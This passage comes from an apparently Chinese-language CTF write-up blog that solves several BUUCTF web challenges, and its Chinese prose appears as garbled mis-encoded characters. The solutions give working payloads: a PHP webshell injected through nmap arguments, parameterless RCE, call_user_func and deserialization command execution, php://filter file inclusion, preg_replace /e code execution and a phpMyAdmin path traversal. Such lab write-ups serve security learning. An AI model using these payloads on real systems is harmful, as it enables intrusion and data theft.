class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>IndexController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/Index<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>LoginController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.wm.ctf.LoginController<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>LoginController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/Login<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.wm.ctf.DownloadController<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/Download<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>FlagController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.wm.ctf.FlagController<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>FlagController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/Flag<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p> WEB-INFä¸»è¦åŒ…å«ä»¥ä¸‹æ–‡ä»¶æˆ–ç›®å½•ï¼š<br> &#x2F;WEB-INF&#x2F;web.xmlï¼šWebåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº† servlet å’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™ã€‚<br> &#x2F;WEB-INF&#x2F;classes&#x2F;ï¼šå«äº†ç«™ç‚¹æ‰€æœ‰ç”¨çš„ class æ–‡ä»¶ï¼ŒåŒ…æ‹¬ servlet class å’Œéservlet classï¼Œä»–ä»¬ä¸èƒ½åŒ…å«åœ¨ .jaræ–‡ä»¶ä¸­<br> &#x2F;WEB-INF&#x2F;lib&#x2F;ï¼šå­˜æ”¾webåº”ç”¨éœ€è¦çš„å„ç§JARæ–‡ä»¶ï¼Œæ”¾ç½®ä»…åœ¨è¿™ä¸ªåº”ç”¨ä¸­è¦æ±‚ä½¿ç”¨çš„jaræ–‡ä»¶,å¦‚æ•°æ®åº“é©±åŠ¨jaræ–‡ä»¶<br> &#x2F;WEB-INF&#x2F;src&#x2F;ï¼šæºç ç›®å½•ï¼ŒæŒ‰ç…§åŒ…åç»“æ„æ”¾ç½®å„ä¸ªjavaæ–‡ä»¶ã€‚<br> &#x2F;WEB-INF&#x2F;database.propertiesï¼šæ•°æ®åº“é…ç½®æ–‡ä»¶</p></blockquote><p>ä½¿ç”¨<code>filename=/WEB-INF/classes/com/wm/ctf/FlagController.class</code>å¾—åˆ°</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> defpackage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(name = &quot;FlagController&quot;)</span></span><br><span class="line"><span class="comment">/* renamed from: FlagController  reason: default package */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FlagController</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="string">&quot;ZmxhZ3swNzc5OTY5NC05ZGE3LTQwNmEtYTExMC1kNjAzMmZkNzNiYWF9Cg==&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* access modifiers changed from: protected */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        httpServletResponse.getWriter().print(<span class="string">&quot;&lt;h1&gt;Flag is nearby ~ Come on! ! !&lt;/h1&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è§£ç å…¶ä¸­çš„<code>ZmxhZ3swNzc5OTY5NC05ZGE3LTQwNmEtYTExMC1kNjAzMmZkNzNiYWF9Cg==</code>å³å¯</p><h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><p>æ‰“å¼€è·å¾—æºç ï¼Œ<code>payload</code>å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?host=&#x27;&lt;?php @eval($_POST[&quot;a&quot;]);?&gt; -oG 1.php &#x27;</span><br></pre></td></tr></table></figure><p>ç„¶åèšå‰‘è¿æ¥å³å¯ï¼Œç›®å½•ä¸ºmd5å€¼</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://e4c67e98-af95-4fe1-bbc4-ed2af50839e7.node4.buuoj.cn:81/66be3929475684f026651c8f42e8831e/1.php</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://paper.seebug.org/164/">PHP escapeshellarg()+escapeshellcmd() ä¹‹æ®‡</a></p></blockquote><h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p>æ¨¡æ¿æ³¨å…¥</p><p>![](D:&#x2F;MyBlog&#x2F;Blogs&#x2F;buuPics&#x2F;[BJDCTF2020]The mystery of ip.png)</p><blockquote><p><a href="https://imququ.com/post/x-forwarded-for-header-in-http.html">HTTP è¯·æ±‚å¤´ä¸­çš„ X-Forwarded-For</a></p></blockquote><h2 id="GXYCTF2019-ç¦æ­¢å¥—å¨ƒ"><a href="#GXYCTF2019-ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ"></a>[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</h2><p>ä½¿ç”¨<code>dirsearch</code>æ‰«æåå‘ç°å¯èƒ½æœ‰<code>git</code>æºç æ³„éœ²ï¼Œä½¿ç”¨<a href="https://github.com/lijiejie/GitHack">GitHack</a>ä¸‹è½½å¾—åˆ°æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;å†å¥½å¥½æƒ³æƒ³ï¼&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ç¦ç”¨äº†ä¸€äº›å‡½æ•°ï¼Œå¹¶ä¸”ä»ç¬¬ä¸‰ä¸ª<code>if</code>å¯ä»¥çœ‹å‡ºæ˜¯<a href="https://blog.csdn.net/Manuffer/article/details/120738755">æ— å‚æ•°RCE</a></p><h3 id="æ³•ä¸€-array-reverse"><a href="#æ³•ä¸€-array-reverse" class="headerlink" title="æ³•ä¸€ array_reverse()"></a>æ³•ä¸€ array_reverse()</h3><p>æ„é€ <code>payload</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#æŸ¥çœ‹flag.phpä½ç½®</span><br><span class="line">?exp=print_r(scandir(current(localeconv())));</span><br><span class="line">#æŸ¥çœ‹flag</span><br><span class="line">?exp=show_source(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure><h3 id="æ³•äºŒ-session-id"><a href="#æ³•äºŒ-session-id" class="headerlink" title="æ³•äºŒ session_id()"></a>æ³•äºŒ session_id()</h3><p>å¼€å¯<code>burp</code>ï¼Œåœ°å€æ è¾“å…¥<code>payload</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?exp=show_source(session_id(session_start()));</span><br></pre></td></tr></table></figure><p>æ·»åŠ <code>Cookie</code>åæ”¾è¡Œå³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie: PHPSESSID=flag.php</span><br></pre></td></tr></table></figure><blockquote><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/l2872253606/article/details/125246229">[GXYCTF2019]ç¦æ­¢å¥—å¨ƒâ€“è¯¦è§£</a></p></blockquote><h2 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb</h2><p>æŠ“åŒ…ä¿®æ”¹<code>post</code>å‚æ•°åä»æŠ¥é”™ä¸­å‘ç°ä½¿ç”¨äº†<code>call_user_func()</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Warning:  call_user_func() expects parameter 1 to be a valid callback, function &#x27;echo&#x27; not found or invalid function name in /var/www/html/index.php on line 24</span><br></pre></td></tr></table></figure><p>æµ‹è¯•åå‘ç°ç¦ç”¨äº†å¾ˆå¤šå‡½æ•°ï¼Œä¸è¿‡<code>file_get_contents</code>å¯ä»¥ç”¨ï¼Œè·å¾—<code>index.php</code>æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$disable_fun</span>=<span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,<span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">    <span class="variable">$a</span>= <span class="title function_ invoke__">gettype</span>(<span class="variable">$result</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">gettime</span>(<span class="variable">$this</span>-&gt;func, <span class="variable">$this</span>-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;func&quot;</span>];</span><br><span class="line"><span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$func</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="variable">$func</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$func</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>,<span class="variable">$disable_fun</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">gettime</span>(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="æ³•ä¸€-ç»•è¿‡"><a href="#æ³•ä¸€-ç»•è¿‡" class="headerlink" title="æ³•ä¸€ \ç»•è¿‡"></a>æ³•ä¸€ \ç»•è¿‡</h3><p><code>payload</code>å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#æŸ¥çœ‹å½“å‰ç›®å½•    bg.jpg index.php index.php</span><br><span class="line">func=\system&amp;p=ls</span><br><span class="line">#æŸ¥çœ‹æ ¹ç›®å½• </span><br><span class="line">func=\system&amp;p=ls /</span><br><span class="line">#æŸ¥çœ‹tmpç›®å½•    flagoefiu4r93 pear pear</span><br><span class="line">func=\system&amp;p=ls /tmp</span><br><span class="line">#æŸ¥çœ‹flag</span><br><span class="line">func=\system&amp;p=cat /tmp/flagoefiu4r93</span><br><span class="line">#ä¹Ÿå¯ä»¥ç›´æ¥ç”¨findæŸ¥æ‰¾flagæ‰€åœ¨ç›®å½•</span><br><span class="line">func=\system&amp;p=find / -name flag*</span><br></pre></td></tr></table></figure><h3 id="æ³•äºŒ-ååºåˆ—åŒ–"><a href="#æ³•äºŒ-ååºåˆ—åŒ–" class="headerlink" title="æ³•äºŒ ååºåˆ—åŒ–"></a>æ³•äºŒ ååºåˆ—åŒ–</h3><p>æ‰€ç”¨<code>exp</code>å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">    <span class="variable">$a</span>= <span class="title function_ invoke__">gettype</span>(<span class="variable">$result</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;cat /tmp/flagoefiu4r93&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">gettime</span>(<span class="variable">$this</span>-&gt;func, <span class="variable">$this</span>-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>).PHP_EOL;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>payload</code>å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>å‚è€ƒ: <a href="https://blog.csdn.net/snowlyzz/article/details/124697304">[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]ä¹‹phpweb</a></p></blockquote><h2 id="BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"><a href="#BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤" class="headerlink" title="[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"></a>[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</h2><p>æ‰“å¼€è·å¾—æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ–‡ä»¶åŒ…å«ï¼Œä½¿ç”¨å¦‚ä¸‹<code>payload</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#url</span><br><span class="line">/?text=php://input&amp;file=php://filter/read=convert.base64-encode/resource=next.php</span><br><span class="line">#postæ•°æ®</span><br><span class="line">I have a dream</span><br><span class="line">#ä¹Ÿå¯ä»¥ç”¨dataåè®®ç»•è¿‡æ–‡ä»¶å†…å®¹éªŒè¯</span><br><span class="line">/?text=data://text/plain,I%20have%20a%20dream&amp;file=php://filter/read/convert.base64-encode/resource=next.php</span><br></pre></td></tr></table></figure><p>å°†å¾—åˆ°çš„ç¼–ç <code>base64</code>è§£ç åå¾—åˆ°<code>next.php</code>æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åˆ©ç”¨<a href="https://blog.csdn.net/weixin_43749601/article/details/113417093">preg_replace() &#x2F;eä»£ç æ‰§è¡Œæ¼æ´</a>å³å¯(ä¹Ÿå¯ä»¥å‚è€ƒ<a href="https://www.jb51.net/article/145649.htm">è¿™ç¯‡æ–‡ç« </a>)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/next.php?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure><h2 id="GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"><a href="#GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“" class="headerlink" title="[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"></a>[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“</h2><p>æ ¹æ®æç¤ºæ‰¾åˆ°<code>phpmyadmin</code>é¡µé¢ï¼Œæ ¹æ®å…¶ç‰ˆæœ¬<code>4.8.1</code>è¿›è¡Œç™¾åº¦ï¼Œå‘ç°<code>CVE-2018-12613</code>å¯ç”¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../flag</span><br></pre></td></tr></table></figure><blockquote><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/m0_47418965/article/details/121708917">æœ€å…¨phpmyadminæ¼æ´æ±‡æ€»</a></p></blockquote><h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><p>ä½¿ç”¨<code>/index.php?category=woofers1</code>æµ‹è¯•åå‘ç°æŠ¥é”™</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Warning: include(woofers1.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 37</span><br><span class="line"></span><br><span class="line">Warning: include(): Failed opening &#x27;woofers1.php&#x27; for inclusion (include_path=&#x27;.:/usr/local/lib/php&#x27;) in /var/www/html/index.php on line 37</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>/index.php?category=php://filter/read/convert.base64-encode/resource=index</code>è·å¾—<code>index.php</code>çš„æºç ï¼Œå…¶ä¸­<code>php</code>éƒ¨åˆ†å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span 